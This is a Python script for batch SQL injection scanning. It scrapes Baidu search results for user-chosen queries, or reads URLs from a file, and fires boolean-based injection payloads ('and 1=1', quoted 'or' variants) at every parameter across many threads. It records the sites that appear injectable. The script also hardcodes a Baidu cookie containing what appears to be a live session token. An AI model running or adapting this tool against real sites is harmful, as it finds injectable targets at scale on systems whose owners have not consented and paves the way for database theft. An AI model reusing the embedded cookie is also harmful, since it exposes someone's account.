# -*- coding: utf-8 -*-
#!E:\\python\\python.exe

import requests
import threading
import sys
import re
import time
import signal
from optparse import OptionParser


class batch_sql_injection():
    def __init__(self):
        self.nnew_flag=False#用于禁锢百度爬虫多参数和单参数
        self.end='                                                                        '#为了美观
        self.flag_num = 0#用于存储线程结束的数量,然后是循环终止
        self.new_flag=False#用于终止循环
        self.valuable_url=[]#存储可注入的url
        self.url_list=[]#存储要测试的url
        self.sql_statement()#读取参数
        self.User_Agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134'
        self.Cookie='BAIDUID=E129C7314626E9E3E48EDB8849CB2D64:SL=0:NR=50:FG=1; BIDUPSID=05CB85424D39AF001BEE9F63FE3DC100; PSTM=1575649528; BD_UPN=13314752; __cfduid=d7ea233a8435758d7c6c791573c056c921575717023; BDUSS=29pZk5qT3A1UWk1SHNnQjFoTjFlUXlMTlBGYWVZVGlRWDd0bHlEQlRxUFhKWjllRVFBQUFBJCQAAAAAAAAAAAEAAADN5e3AaWFtaGFja2Vya2lkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANeYd17XmHdeZ; MCITY=-9019%3A; H_WISE_SIDS=147719_146488_109775_142018_147276_148320_147887_148194_147280_146538_148001_147722_147828_147889_146573_148524_147346_127969_147593_147238_146551_146454_145417_146652_147024_147353_146732_148186_131423_144659_142207_147528_148201_107315_146824_148299_146395_144966_145608_139883_146786_148346_147711_146054_145398_110085; ispeed_lsm=2; H_PS_PSSID=32293_1436_32357_31253_32351_32045_32116_31321_26350; BDORZ=B490B5EBF6F3CD402E515D22BCDA1598; yjs_js_security_passport=9b1515b61212865c34b0a2243eca06758ad8420f_1595754991_js; delPer=0; BD_CK_SAM=1; PSINO=1; H_PS_645EC=d2a37eote8p3z4LmxwiqgmUyhdprmkB0bkfSAvaeHzHjVP7ykFpNKPABmMU; COOKIE_SESSION=0_0_1_0_0_0_1_0_1_0_0_0_0_0_0_0_0_0_1595818596%7C1%230_0_1595818596%7C1; ZD_ENTRY=baidu; sug=3; sugstore=0; ORIGIN=0; bdime=0'
        self.input_init()#读取参数
        self.flag = False#终止循环
    def sql_statement(self):#sql语句存放点
        self.sql_num_and_list = ['and 1=1','and 1=2']
        self.sql_str_and_list = ["' and '1'='1","'and '1'='2",'" and "1"="1','" and "1"="2']
        self.sql_num_or_list = ['or 1=1','or 1=2']
        self.sql_str_or_list = ["' or '1'='1","' or '1'='2",'" or "1"="1','" or "1"="2']
        self.sql_error_list = []
    def input_init(self):#获取用户输入
        use = '''
        -u --url  URL to test
        -t --thread  Number of threads required
        -f --file  File for url
        -b --baidu  Baidu search engine
        -p --page  Number of pages you want to crawl [10 pages]
        -s --save File for valuable url
        -k --key_file Key file for baidu
        -o --timeout Timeout number
        '''
        parser = OptionParser(usage=use, version="%prog 1.0")
        parser.add_option("-u", "--url", dest="url", help="Please input test url")
        parser.add_option("-f", "--file", dest="file", help="Please input url file")
        parser.add_option("-t", "--thread", dest="thread", help="Please select thread[default=10]")
        parser.add_option("-b", "--baidu", dest="baidu", help="Please input baidu grammer")
        parser.add_option("-k","--key_file",dest="key_file",help="Please input baidu statement file")
        parser.add_option("-p", "--page", dest="page", help="Please select the number of pages to crawl")
        parser.add_option("-s", "--save", dest="save", help="Please input save file")
        parser.add_option("-o","--timeout",dest="timeout",help="Please input out time")
        option,args = parser.parse_args()
        self.url = option.url
        self.file = option.file
        self.thread = option.thread
        self.baidu = option.baidu
        self.page = option.page
        self.save_file_name = option.save
        self.key_file = option.key_file
        self.timeout = option.timeout
        self.thread_list=[]
        if self.save_file_name != None:
            self.save_file = open(self.save_file_name,'a')
        if self.timeout == None:
            self.timeout = '1'
        self.timeout = int(self.timeout)
        if self.page == None:
            self.page = '5'
        self.page = int(self.page)
        if self.thread==None:
            self.thread='10'
        self.thread = int(self.thread)
    def main(self):#主函数
        if self.url!=None:#-u 单独url模式
            self.sql_injection(self.url)
        elif self.file!=None:#-f 多url模式
            try:
                file = open(self.file,'r')
            except:
                print("Url file is not exists")
                return False
            file_read = file.readlines()
            num = len(file_read)
            for i in range(0,self.thread):#划分多线程
                t = threading.Thread(target=self.sql_url_list_run,args=(file_read[i * (num // self.thread):(i + 1) * (num // self.thread)],))
                t.start()
                self.thread_list.append(t)
            for t in self.thread_list:
                t.join()
            if num % self.thread!=0:
                self.sql_url_list_run(file_read[-(num%self.thread):])
        elif self.baidu!=None:#-b 单独参数百度爬虫测试模式
            self.flag=True
            t = threading.Thread(target=self.baidu_spider,args=(self.baidu,self.page))
            t.start()
            for i in range(0,self.thread):
                t0 = threading.Thread(target=self.sql_injection,args=('',))
                self.thread_list.append(t0)
                t0.start()
            for t1 in self.thread_list:
                t1.join()
            print(1)
        elif self.key_file!=None:#-k 多参数百度爬虫测试模式
            try:
                key_file = open(self.key_file,'r').readlines()
            except:
                print("Key file is not exists")
                return False
            num = len(key_file)
            for i in range(0,self.thread):
                t = threading.Thread(target=self.sql_baidu_spider_more,args=(key_file[i*(num//self.thread):(i+1)*(num//self.thread)],))
                self.thread_list.append(t)
                t.start()
            for t in self.thread_list:
                t.join()
            if num % self.thread!=0:
                self.new_flag=True
                self.sql_baidu_spider_more(key_file[-(num%self.thread):])
    def sql_url_list_run(self,url_list):#从url列表中读取参数然后循环交给sql_injection处理
        for url in url_list:
            self.sql_injection(url.strip("\n"))
    def sql_baidu_spider_more(self,key_list):#百度多参数爬虫测试
        for key in key_list:
            self.baidu_spider(key.strip('\n'),self.page)
        self.flag_num+=1
        self.sql_injection(url='')



    def baidu_spider(self,key,page):#百度爬虫
        pattern = 'data-tools=\'{"title":"(.*?)","url":"(.*?)"}\''
        for p in range(0, page * 50 + 1, 50):
            baidu_url = 'http://www.baidu.com/s?wd={}&pn={}&cl=3&f4s=&isid='.format(key, p)
            try:
                r = requests.get(baidu_url,headers={'User-Agent':self.User_Agent,'Cookie':self.Cookie})
            except:
                print(baidu_url)
                continue
            res = re.findall(pattern, r.text)
            for reg in res:
                try:
                    new_url = requests.get(reg[1], timeout=1).url
                    self.url_list.append(new_url)
                except:
                    pass
        self.flag=False
    def sql_num_injection(self,url):#数字型sql注入检测函数
        sql_and_pararm = self.sql_num_and_list
        sql_or_pararm = self.sql_num_or_list
        url = url
        try:
            template_request = requests.get(url,timeout=self.timeout,headers={'User-Agent':self.User_Agent})#请求样本用于对比
        except:
            return False
        test_pararms = url.split('?')[1].split('&')#取参数
        if test_pararms==[]:
            return False
        for test_pararm in test_pararms:
            test_url = url.replace(test_pararm,test_pararm+' '+sql_and_pararm[0])#进行参数替换
            try:
                r = requests.get(test_url,timeout=self.timeout,headers={'User-Agent':self.User_Agent})
            except:
                continue
            if r.text == template_request.text:#对比页面是否有不同来测试是否存在sql注入
                test_url = url.replace(test_pararm,test_pararm+' '+sql_and_pararm[1])#同上,套娃
                try:
                    r = requests.get(test_url,timeout=self.timeout,headers={'User-Agent':self.User_Agent})
                except:
                    continue
                if r.text != template_request.text:
                    self.valuable_url.append(test_pararm+' in '+url+' is And Digital Sql Injection')
                    print('\r'+test_pararm+' in '+url+' is And Digital Sql Injection')
                    try:
                        self.save_file.write(test_pararm+' in '+url+' is And Digital Sql Injection\n')
                        self.save_file.flush()
                    except:
                        pass
                    continue
            test_url = url.replace(test_pararm, test_pararm +' '+sql_or_pararm[0])
            try:
                r = requests.get(test_url,timeout=self.timeout,headers={'User-Agent':self.User_Agent})
            except:
                continue
            if r.text != template_request.text:
                test_url = url.replace(test_pararm,test_pararm+' '+sql_or_pararm[1])
                try:
                    r = requests.get(test_url,timeout=self.timeout,headers={'User-Agent':self.User_Agent})
                except:
                    continue
                if r.text == template_request.text:
                    self.valuable_url.append(test_pararm+' in '+url+' is Or Digital Sql Injection')
                    print('\r'+test_pararm+' in '+url+' is Or Digital Sql Injection')
                    try:
                        self.save_file.write(test_pararm+' in '+url+' is Or Digital Sql Injection\n')
                        self.save_file.flush()
                    except:
                        pass
    def sql_str_injection(self,url):#字符型sql注入检测函数
        url = url
        sql_and_pararm = self.sql_str_and_list
        sql_or_pararm = self.sql_str_or_list
        url = url
        try:
            template_request = requests.get(url,timeout=self.timeout,headers={'User-Agent':self.User_Agent})#请求样本用于对比
        except:
            return False
        test_pararms = url.split('?')[1].split('&')
        if test_pararms==[]:
            return False
        for test_pararm in test_pararms:
            test_url = url.replace(test_pararm,test_pararm+' '+sql_and_pararm[0])
            try:
                r = requests.get(test_url,timeout=self.timeout,headers={'User-Agent':self.User_Agent})
            except:
                continue
            if r.text == template_request.text:
                test_url = url.replace(test_pararm,test_pararm+' '+sql_and_pararm[1])
                try:
                    r = requests.get(test_url,timeout=self.timeout,headers={'User-Agent':self.User_Agent})
                except:
                    continue
                if r.text != template_request.text:
                    self.valuable_url.append(test_pararm+' in '+url+' is And Character Sql Injection')
                    print('\r'+test_pararm+' in '+url+' is And Charater Sql Injection')
                    try:
                        self.save_file.write(test_pararm+' in '+url+' is And Character Sql Injection\n')
                        self.save_file.flush()
                    except:
                        pass
                    continue
            test_url = url.replace(test_pararm, test_pararm + sql_or_pararm[0])
            try:
                r = requests.get(test_url,timeout=self.timeout,headers={'User-Agent':self.User_Agent})
            except:
                continue
            if r.text != template_request.text:
                test_url = url.replace(test_pararm,test_pararm+sql_or_pararm[1])
                try:
                    r = requests.get(test_url,timeout=self.timeout,headers={'User-Agent':self.User_Agent})
                except:
                    continue
                if r.text == template_request.text:
                    self.valuable_url.append(test_pararm+' in '+url+' is Or Charater Sql Injection')
                    print('\r'+test_pararm+' in '+url+' is Or Charater Sql Injection')
                    try:
                        self.save_file.write(test_pararm+' in '+url+' is Or Charater Sql Injection\n')
                        self.save_file.flush()
                    except:
                        pass
            test_url = url.replace(test_pararm,test_pararm+sql_and_pararm[2])
            try:
                r = requests.get(test_url,timeout=self.timeout,headers={'User-Agent':self.User_Agent})
            except:
                continue
            if r.text == template_request.text:
                test_url = url.replace(test_pararm,test_pararm+sql_and_pararm[3])
                try:
                    r = requests.get(test_url,timeout=self.timeout,headers={'User-Agent':self.User_Agent})
                except:
                    continue
                if r.text != template_request.text:
                    self.valuable_url.append(test_pararm+' in '+url+' is And Character Sql Injection(")')
                    print('\r'+test_pararm+' in '+url+' is And Charater Sql Injection(")')
                    try:
                        self.save_file.write(test_pararm+' in '+url+' is And Charater Sql Injection(")\n')
                        self.save_file.flush()
                    except:
                        pass
                    continue
            test_url = url.replace(test_pararm, test_pararm + sql_or_pararm[2])
            try:
                r = requests.get(test_url,timeout=self.timeout,headers={'User-Agent':self.User_Agent})
            except:
                continue
            if r.text != template_request.text:
                test_url = url.replace(test_pararm,test_pararm+sql_or_pararm[3])
                try:
                    r = requests.get(test_url,timeout=self.timeout,headers={'User-Agent':self.User_Agent})
                except:
                    continue
                if r.text == template_request.text:
                    self.valuable_url.append(test_pararm+' in '+url+' is Or Charater Sql Injection(")')
                    print('\r'+test_pararm+' in '+url+' is Or Charater Sql Injection(")')
                    try:
                        self.save_file.write(test_pararm+' in '+url+' is Or Charater Sql Injection(")\n')
                        self.save_file.flush()
                    except:
                        pass
    def sql_injection(self,url):#sql注入测试总函数,用于支配其他测试函数
        if url != '':
            url = url
            print("\rTest url:"+url,end=self.end)
            self.sql_num_injection(url)
            self.sql_str_injection(url)
        else:
            while self.flag:
                self.nnew_flag=True
                try:
                    for url in self.url_list:
                        self.url_list.remove(url)
                        print("\rTest url:" + url, end=self.end)
                        self.sql_num_injection(url)
                        self.sql_str_injection(url)
                except:
                    pass
            while not self.nnew_flag and self.flag_num!=self.thread or self.flag_num==self.thread+1:
                try:
                    for url in self.url_list:
                        self.url_list.remove(url)
                        print("\rTest url:" + url, end=self.end)
                        self.sql_num_injection(url)
                        self.sql_str_injection(url)
                    if self.new_flag:
                        break
                except:
                    pass
if __name__ == '__main__':
    batch_sql_injection().main()
